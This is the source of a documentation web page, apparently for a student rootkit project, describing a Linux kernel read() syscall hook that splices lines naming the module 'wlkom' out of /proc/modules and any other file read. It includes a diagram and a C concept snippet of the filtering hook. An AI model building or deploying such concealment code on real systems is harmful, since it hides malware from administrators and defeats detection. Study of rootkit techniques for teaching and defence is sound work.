---
import FeaturePage from '../../layouts/FeaturePage.astro';
---

<FeaturePage
  title="Hide Lines from Files"
  description="Hooks the read() syscall to filter lines containing specific strings before they reach userland."
  badge="Optional"
  points="2 pts"
  slug="hide-lines"
>

<section class="section">
  <h2 class="section-title">// How it works</h2>
  <div class="prose">
    <p>
      Even if <code>lsmod</code> and <code>/proc/modules</code> are hidden via the module list,
      a determined user could still <code>cat /proc/modules</code> directly. The <strong><code>read()</code>
      hook</strong> addresses this by intercepting every file read in userland and scanning the returned
      buffer for lines that match a hidden target string.
    </p>
    <p>
      When a match is found, the hook <em>splices the line out</em> of the buffer in place — adjusting
      all subsequent content to fill the gap — before returning to the caller. The caller receives a
      shorter buffer with the offending line removed, as if it was never there.
    </p>
    <p>
      The implementation supports <strong>multiple hidden prefixes</strong> (an array of strings)
      so that different content can be hidden simultaneously.
    </p>
  </div>
</section>

<section class="section">
  <h2 class="section-title">// Buffer transformation diagram</h2>
  <div class="diagram">
    <svg viewBox="0 0 680 240" xmlns="http://www.w3.org/2000/svg" font-family="'Courier New',monospace">
      <defs>
        <marker id="a" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L0,6 L8,3 z" fill="#00ff41"/></marker>
      </defs>
      <!-- Raw buffer -->
      <text x="170" y="22" text-anchor="middle" fill="#8b949e" font-size="11">Buffer returned by real read()</text>
      <rect x="20" y="32" width="300" height="28" rx="3" fill="#161b22" stroke="#30363d" stroke-width="1"/>
      <text x="170" y="50" text-anchor="middle" fill="#8b949e" font-size="10">nvidia 1234567 0</text>
      <rect x="20" y="62" width="300" height="28" rx="3" fill="#161b22" stroke="#e3b341" stroke-width="1" stroke-opacity="0.7"/>
      <text x="170" y="80" text-anchor="middle" fill="#e3b341" font-size="10">wlkom 98304 0 ← matches hidden prefix</text>
      <rect x="20" y="92" width="300" height="28" rx="3" fill="#161b22" stroke="#30363d" stroke-width="1"/>
      <text x="170" y="110" text-anchor="middle" fill="#8b949e" font-size="10">bluetooth 458752 2</text>
      <rect x="20" y="122" width="300" height="28" rx="3" fill="#161b22" stroke="#30363d" stroke-width="1"/>
      <text x="170" y="140" text-anchor="middle" fill="#8b949e" font-size="10">vboxguest 90112 2</text>

      <!-- Arrow -->
      <line x1="340" y1="90" x2="390" y2="90" stroke="#00ff41" stroke-width="2" marker-end="url(#a)"/>
      <text x="365" y="82" text-anchor="middle" fill="#00ff41" font-size="10">splice</text>
      <text x="365" y="103" text-anchor="middle" fill="#8b949e" font-size="9">memmove</text>

      <!-- Filtered buffer -->
      <text x="550" y="22" text-anchor="middle" fill="#8b949e" font-size="11">Filtered buffer returned to caller</text>
      <rect x="400" y="32" width="260" height="28" rx="3" fill="#161b22" stroke="#30363d" stroke-width="1"/>
      <text x="530" y="50" text-anchor="middle" fill="#8b949e" font-size="10">nvidia 1234567 0</text>
      <rect x="400" y="62" width="260" height="28" rx="3" fill="#161b22" stroke="#30363d" stroke-width="1"/>
      <text x="530" y="80" text-anchor="middle" fill="#8b949e" font-size="10">bluetooth 458752 2</text>
      <rect x="400" y="92" width="260" height="28" rx="3" fill="#161b22" stroke="#30363d" stroke-width="1"/>
      <text x="530" y="110" text-anchor="middle" fill="#8b949e" font-size="10">vboxguest 90112 2</text>
      <text x="530" y="155" text-anchor="middle" fill="#00ff41" font-size="10">wlkom line removed</text>
      <text x="530" y="170" text-anchor="middle" fill="#8b949e" font-size="10">return value decremented by line length</text>
    </svg>
  </div>
</section>

<section class="section">
  <h2 class="section-title">// Implementation (concept)</h2>
  <div class="code-block">
    <div class="code-header"><span>read() hook — filter logic</span><span class="lang">C</span></div>
    <pre><code>{`asmlinkage ssize_t hooked_read(const struct pt_regs *regs) {
    ssize_t ret = orig_read(regs);   // call the real read()
    if (ret <= 0) return ret;

    char __user *buf   = (char __user *)regs->si;
    char        *kbuf  = kmalloc(ret + 1, GFP_KERNEL);
    copy_from_user(kbuf, buf, ret);
    kbuf[ret] = '\\0';

    char *pos = kbuf;
    while ((pos = strstr(pos, hidden_prefix)) != NULL) {
        char *end = strchr(pos, '\\n');
        if (!end) { *pos = '\\0'; break; }
        end++;
        // splice: shift remaining content over the hidden line
        size_t tail = (kbuf + ret) - end;
        memmove(pos, end, tail);
        ret -= (end - pos);
        kbuf[ret] = '\\0';
    }

    copy_to_user(buf, kbuf, ret);
    kfree(kbuf);
    return ret;   // adjusted length (line removed)
}`}</code></pre>
  </div>
</section>

<section class="section">
  <h2 class="section-title">// What it hides</h2>
  <div class="steps">
    <div class="step">
      <span class="step-num">01</span>
      <div class="step-body">
        <strong>/proc/modules</strong>
        <p>Removes the <code>wlkom</code> line so <code>cat /proc/modules | grep wlkom</code> returns nothing.</p>
      </div>
    </div>
    <div class="step">
      <span class="step-num">02</span>
      <div class="step-body">
        <strong>Any text file</strong>
        <p>The hook applies to all <code>read()</code> calls — any file whose content mentions the target string will have that content stripped.</p>
      </div>
    </div>
    <div class="step">
      <span class="step-num">03</span>
      <div class="step-body">
        <strong>Multiple prefixes</strong>
        <p>The implementation supports an array of hidden strings, iterated for each read buffer.</p>
      </div>
    </div>
  </div>
</section>

</FeaturePage>
